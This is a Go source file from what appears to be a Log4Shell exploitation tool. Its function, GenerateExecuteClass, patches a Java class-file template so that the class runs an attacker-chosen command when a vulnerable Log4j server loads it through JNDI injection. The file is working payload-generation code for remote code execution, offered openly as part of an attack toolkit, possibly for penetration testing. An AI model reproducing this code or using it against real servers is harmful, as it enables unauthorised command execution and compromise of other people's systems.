package log4shell

import (
	"bytes"
	"encoding/binary"

	"github.com/pkg/errors"
)

// GenerateExecuteClass is used to generate class file with execute command.
func GenerateExecuteClass(template []byte, cmd, class string) ([]byte, error) {
	const (
		fileNameFlag = "Exec.java"
		commandFlag  = "${cmd}"
		className    = "Exec\x01"
	)

	// find three special strings
	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
	if fileNameIdx == -1 || fileNameIdx < 2 {
		return nil, errors.New("failed to find file name in execute template")
	}
	commandIdx := bytes.Index(template, []byte(commandFlag))
	if commandIdx == -1 || commandIdx < 2 {
		return nil, errors.New("failed to find command in execute template")
	}
	classNameIdx := bytes.Index(template, []byte(className))
	if classNameIdx == -1 || classNameIdx < 2 {
		return nil, errors.New("failed to find class name in execute template")
	}

	// check arguments
	if cmd == "" {
		return nil, errors.New("empty command")
	}
	if class == "" {
		class = "Exec"
	}

	// generate output class file
	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))

	// change file name
	output.Write(template[:fileNameIdx-2])
	fileName := class + ".java"
	size := beUint16ToBytes(uint16(len(fileName)))
	output.Write(size)
	output.WriteString(fileName)

	// change command
	output.Write(template[fileNameIdx+len(fileNameFlag) : commandIdx-2])
	size = beUint16ToBytes(uint16(len(cmd)))
	output.Write(size)
	output.WriteString(cmd)

	// change class name
	output.Write(template[commandIdx+len(commandFlag) : classNameIdx-2])
	size = beUint16ToBytes(uint16(len(class)))
	output.Write(size)
	output.WriteString(class)
	output.Write(template[classNameIdx+len(className)-1:])
	return output.Bytes(), nil
}

func beUint16ToBytes(n uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, n)
	return b
}
